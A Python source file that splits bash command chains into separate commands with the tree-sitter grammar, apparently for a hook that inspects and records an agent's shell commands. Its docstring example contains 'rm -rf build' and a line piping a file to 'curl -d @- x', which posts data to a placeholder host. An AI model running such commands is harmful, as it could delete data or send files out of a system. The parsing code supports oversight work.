"""Split a command line into the commands the shell runs one after another.

  'cd /tmp && rm -rf build; cat k | curl -d @- x'
    -> ['cd /tmp', 'rm -rf build', 'cat k | curl -d @- x']

Uses the tree-sitter bash grammar: a top-level `list` node is a && / || chain, and the
program's other children are the ; / newline separated statements. Everything else
(pipelines, subshells, $( ), loops, if, case, heredocs) is one unit. Comments are
dropped since they never run. Parts are slices of the original text, so the hook shows
and remembers what the agent actually wrote. Invalid bash stays whole: don't guess.
"""
import tree_sitter_bash
from tree_sitter import Language, Parser

_PARSER = Parser(Language(tree_sitter_bash.language()))


def split_chain(command: str) -> list[str]:
    source = command.encode()
    root = _PARSER.parse(source).root_node
    if root.has_error:
        return [command]

    parts: list[str] = []

    def walk(node) -> None:
        for child in node.named_children:
            if child.type == "list":
                walk(child)
            elif child.type != "comment":
                parts.append(source[child.start_byte : child.end_byte].decode().strip())

    walk(root)
    return [p for p in parts if p]
